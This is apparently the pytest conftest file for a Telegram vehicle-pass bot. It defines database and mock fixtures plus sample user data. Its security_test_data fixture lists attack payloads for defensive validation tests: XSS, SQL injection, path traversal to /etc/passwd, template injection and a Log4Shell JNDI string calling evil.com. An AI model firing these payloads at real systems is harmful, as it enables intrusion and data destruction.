"""
Конфигурация тестов для Easy Pass Bot
"""
import pytest
import pytest_asyncio
import asyncio
import tempfile
import os
from pathlib import Path
from src.easy_pass_bot.database.database import Database
from src.easy_pass_bot.database.models import User, Pass
from src.easy_pass_bot.config import ROLES, USER_STATUSES, PASS_STATUSES


@pytest.fixture(scope="session")
def event_loop():
    """Создание event loop для тестов"""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest_asyncio.fixture
async def test_db():
    """Фикстура тестовой базы данных"""
    # Создаем временную базу данных
    temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.db')
    temp_file.close()
    
    db = Database(temp_file.name)
    await db.init_db()
    
    yield db
    
    # Очищаем после тестов
    await db.cleanup()
    os.unlink(temp_file.name)


@pytest_asyncio.fixture
async def sample_user():
    """Образец пользователя для тестов"""
    return User(
        telegram_id=123456789,
        role=ROLES['RESIDENT'],
        full_name='Тестовый Пользователь',
        phone_number='+7 900 123 45 67',
        apartment='15',
        status=USER_STATUSES['PENDING']
    )


@pytest_asyncio.fixture
async def sample_pass():
    """Образец пропуска для тестов"""
    return Pass(
        user_id=1,
        car_number='А123БВ777',
        status=PASS_STATUSES['ACTIVE']
    )


@pytest_asyncio.fixture
async def admin_user():
    """Образец администратора для тестов"""
    return User(
        telegram_id=987654321,
        role=ROLES['ADMIN'],
        full_name='Тестовый Админ',
        phone_number='+7 900 987 65 43',
        apartment=None,
        status=USER_STATUSES['APPROVED']
    )


@pytest_asyncio.fixture
async def security_user():
    """Образец охранника для тестов"""
    return User(
        telegram_id=555666777,
        role=ROLES['SECURITY'],
        full_name='Тестовый Охранник',
        phone_number='+7 900 555 66 77',
        apartment=None,
        status=USER_STATUSES['APPROVED']
    )


@pytest.fixture
def mock_telegram_bot():
    """Мок Telegram бота"""
    from unittest.mock import AsyncMock, MagicMock
    
    bot = AsyncMock()
    bot.send_message = AsyncMock()
    bot.session = MagicMock()
    bot.session.close = AsyncMock()
    
    return bot


@pytest.fixture
def mock_dispatcher():
    """Мок диспетчера aiogram"""
    from unittest.mock import MagicMock
    
    dp = MagicMock()
    dp.include_router = MagicMock()
    dp.start_polling = AsyncMock()
    
    return dp


@pytest_asyncio.fixture
async def initialized_services():
    """Инициализированные сервисы для тестов"""
    from src.easy_pass_bot.services.validation_service import ValidationService
    from src.easy_pass_bot.services.notification_service import NotificationService
    from tests.mocks.repository_mocks import MockUserRepository, MockPassRepository, MockNotificationService
    
    # Создаем моки
    user_repo = MockUserRepository()
    pass_repo = MockPassRepository()
    notification_service = MockNotificationService()
    
    # Создаем сервисы
    validation_service = ValidationService()
    await validation_service.initialize()
    
    notification_service = NotificationService()
    await notification_service.initialize()
    
    return {
        'validation_service': validation_service,
        'notification_service': notification_service,
        'user_repo': user_repo,
        'pass_repo': pass_repo
    }


@pytest.fixture
def test_data_dir():
    """Директория с тестовыми данными"""
    return Path(__file__).parent / 'fixtures'


@pytest.fixture
def sample_car_numbers():
    """Образцы номеров автомобилей для тестов"""
    return [
        'А123БВ777',
        'В456ГД888',
        'Е789ЖЗ999',
        'К012ЛМ000',
        'Н345ОП111'
    ]


@pytest.fixture
def sample_phone_numbers():
    """Образцы номеров телефонов для тестов"""
    return [
        '+7 900 123 45 67',
        '+7 900 987 65 43',
        '+7 900 555 66 77',
        '+7 900 111 22 33',
        '+7 900 999 88 77'
    ]


@pytest.fixture
def sample_names():
    """Образцы имен для тестов"""
    return [
        'Иванов Иван Иванович',
        'Петров Петр Петрович',
        'Сидоров Сидор Сидорович',
        'Козлов Козел Козлович',
        'Волков Волк Волкович'
    ]


@pytest.fixture
def sample_apartments():
    """Образцы номеров квартир для тестов"""
    return [
        '1',
        '15',
        '42',
        '100',
        '15А',
        '42Б'
    ]


@pytest.fixture
def invalid_data_samples():
    """Образцы неверных данных для тестов"""
    return {
        'empty_name': '',
        'too_long_name': 'А' * 101,
        'invalid_phone': '123456',
        'empty_phone': '',
        'too_long_apartment': '1' * 11,
        'empty_apartment': '',
        'invalid_car_number': '123ABC456',
        'empty_car_number': '',
        'too_short_search': 'А',
        'too_long_search': 'А' * 25
    }


@pytest.fixture
def performance_test_data():
    """Данные для тестов производительности"""
    return {
        'users_count': 1000,
        'passes_count': 5000,
        'search_queries': 100,
        'concurrent_requests': 50
    }


@pytest.fixture
def security_test_data():
    """Данные для тестов безопасности"""
    return {
        'malicious_inputs': [
            '<script>alert("xss")</script>',
            'DROP TABLE users;',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            '{{7*7}}',
            '{{config}}'
        ],
        'sql_injection_attempts': [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES (1, 'hacker', 'admin'); --",
            "' UNION SELECT * FROM users --"
        ],
        'xss_attempts': [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            'javascript:alert(1)',
            '<iframe src=javascript:alert(1)></iframe>'
        ]
    }


# Настройки pytest
def pytest_configure(config):
    """Конфигурация pytest"""
    config.addinivalue_line(
        "markers", "unit: mark test as unit test"
    )
    config.addinivalue_line(
        "markers", "integration: mark test as integration test"
    )
    config.addinivalue_line(
        "markers", "e2e: mark test as end-to-end test"
    )
    config.addinivalue_line(
        "markers", "performance: mark test as performance test"
    )
    config.addinivalue_line(
        "markers", "security: mark test as security test"
    )
    config.addinivalue_line(
        "markers", "slow: mark test as slow running"
    )


def pytest_collection_modifyitems(config, items):
    """Модификация коллекции тестов"""
    for item in items:
        # Добавляем маркеры по умолчанию
        if "unit" in str(item.fspath):
            item.add_marker(pytest.mark.unit)
        elif "integration" in str(item.fspath):
            item.add_marker(pytest.mark.integration)
        elif "e2e" in str(item.fspath):
            item.add_marker(pytest.mark.e2e)
        
        # Маркируем медленные тесты
        if "performance" in item.name or "load" in item.name:
            item.add_marker(pytest.mark.slow)
            item.add_marker(pytest.mark.performance)
        
        if "security" in item.name or "injection" in item.name:
            item.add_marker(pytest.mark.security)